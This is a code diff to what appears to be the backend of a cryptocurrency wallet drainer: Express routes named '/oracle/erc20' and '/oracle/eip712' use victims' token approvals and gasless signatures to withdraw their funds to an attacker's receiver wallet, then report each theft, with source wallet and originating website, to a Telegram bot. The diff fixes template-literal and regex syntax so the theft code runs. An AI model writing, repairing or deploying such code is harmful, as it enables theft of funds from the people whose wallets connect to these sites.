@@ -225,14 +225,14 @@ let escaper = (ah) => {
     return ah;
   }
 
-  return ah.replace(//g, '\\')
-    .replace(/\/g, '\\')
+  return ah.replace(/_/g, '\\_')
+    .replace(/\*/g, '\\*')
     .replace(/\[/g, '\\[')
     .replace(/\]/g, '\\]')
     .replace(/\(/g, '\\(')
     .replace(/\)/g, '\\)')
-    .replace(//g, '\\')
-    .replace(//g, '\\')
+    .replace(/~/g, '\\~')
+    .replace(/`/g, '\\`')
     .replace(/>/g, '\\>')
     .replace(/#/g, '\\%23')
     .replace(/\+/g, '\\+')
@@ -298,11 +298,11 @@ let contractAddress_;
     let withdrawal = await contractInstance.withdraw({ gasLimit: gasLimitHex });
     await provider.waitForTransaction(withdrawal.hash);
     let withdrawMessage1 =
-        💸 *Contract Token Withdrawn* \n\n +
-        🌐 *From Website*: ${escaper(websiteUrl)}\n +
-        *Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-        🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n +
-        *Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n;
+        `💸 *Contract Token Withdrawn* \n\n` +
+        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
+        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+        `🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
+        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
   
       let withdrawClientServerOptions2 = {
         uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -329,11 +329,11 @@ let contractAddress_;
       await provider.waitForTransaction(tx.hash);
 
       let withdrawMessage =
-      💸* Contract Token Sent to Reciever Address* \n\n +
-      🌐 *From Website*: ${escaper(websiteUrl)}\n +
-      *Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-      🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n +
-      *Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n;
+      `💸* Contract Token Sent to Reciever Address* \n\n` +
+      `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
+      `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+      `🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
+      `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
 
     let withdrawClientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -383,9 +383,9 @@ app.post("/oracle/erc20", async (req, res) => {
     })
 
     let message_ =
-      🟢 *Approval Made for ${escaper(tokenName)} Transfer*\n\n +
-      🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-      🌐 *From Website*: ${escaper(websiteUrl)}\n;
+      `🟢 *Approval Made for ${escaper(tokenName)} Transfer*\n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+      `🌐 *From Website*: ${escaper(websiteUrl)}\n`;
 
     let clientServerOptions__ = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -421,11 +421,11 @@ app.post("/oracle/erc20", async (req, res) => {
       await provider.waitForTransaction(withdrawal.hash);
 
       let withdrawMessage_1 =
-        💸 *Approval Withdrawn* \n\n +
-        🌐 *From Website*: ${escaper(websiteUrl)}\n +
-        *Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-        🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n +
-        *Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n;
+        `💸 *Approval Withdrawn* \n\n` +
+        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
+        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+        `🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
+        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
   
       let withdrawClientServerOptions_1 = {
         uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -449,8 +449,8 @@ app.post("/oracle/erc20", async (req, res) => {
       
     }else{
       let message2 =
-      🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n +
-      *Reason*: Low Approval Amount\n;
+      `🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n` +
+      `*Reason*: Low Approval Amount\n`;
     let clientServerOptions2 = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
       body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message2, disable_web_page_preview: true }),
@@ -467,8 +467,8 @@ app.post("/oracle/erc20", async (req, res) => {
   } catch (error) {
     console.warn("[-] SAFA ERC20 error: ", error)
     let message3 =
-    🔴 *Approval Transfer Error *\n\n +
-    *Reason*: Possible low gas balance\n;
+    `🔴 *Approval Transfer Error *\n\n` +
+    `*Reason*: Possible low gas balance\n`;
   let clientServerOptions3 = {
     uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
     body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message3, disable_web_page_preview: true }),
@@ -520,9 +520,9 @@ app.post("/oracle/eip712", async (req, res) => {
  
 
     let message =
-      🟢 *⛽ Gasless Approval Paid for ${escaper(tokenName)} Transfer ✅*\n\n +
-      🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-      🌐 *From Website*: ${escaper(websiteUrl)}\n;
+      `🟢 *⛽ Gasless Approval Paid for ${escaper(tokenName)} Transfer ✅*\n\n` +
+      `🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+      `🌐 *From Website*: ${escaper(websiteUrl)}\n`;
 
     let clientServerOptions = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -556,11 +556,11 @@ app.post("/oracle/eip712", async (req, res) => {
 
       await provider.waitForTransaction(withdrawal.hash);
       let withdrawMessage =
-        💸 *Gasless Approval Withdrawn* \n\n +
-        🌐 *From Website*: ${escaper(websiteUrl)}\n +
-        *Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n +
-        🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n +
-        *Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n;
+        `💸 *Gasless Approval Withdrawn* \n\n` +
+        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
+        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
+        `🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
+        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
   
       let withdrawClientServerOptions_2 = {
         uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
@@ -581,8 +581,8 @@ app.post("/oracle/eip712", async (req, res) => {
       
     }else{
       let message2 =
-      🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n +
-      *Reason*: Low Approval Amount\n;
+      `🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n` +
+      `*Reason*: Low Approval Amount\n`;
     let clientServerOptions2 = {
       uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
       body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message2, disable_web_page_preview: true }),
@@ -600,8 +600,8 @@ app.post("/oracle/eip712", async (req, res) => {
   } catch (error) {
     console.warn("[-] SAFA EIP error: ")
     let message3 =
-    🔴 *Approval Transfer Error *\n\n +
-    *Reason*: Possible low gas balance\n;
+    `🔴 *Approval Transfer Error *\n\n` +
+    `*Reason*: Possible low gas balance\n`;
   let clientServerOptions4 = {
     uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
     body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message3, disable_web_page_preview: true }),
@@ -617,4 +617,4 @@ app.post("/oracle/eip712", async (req, res) => {
 });
 
 
-app.listen(PORT, () => console.log(Listening on port ${PORT}))
+app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
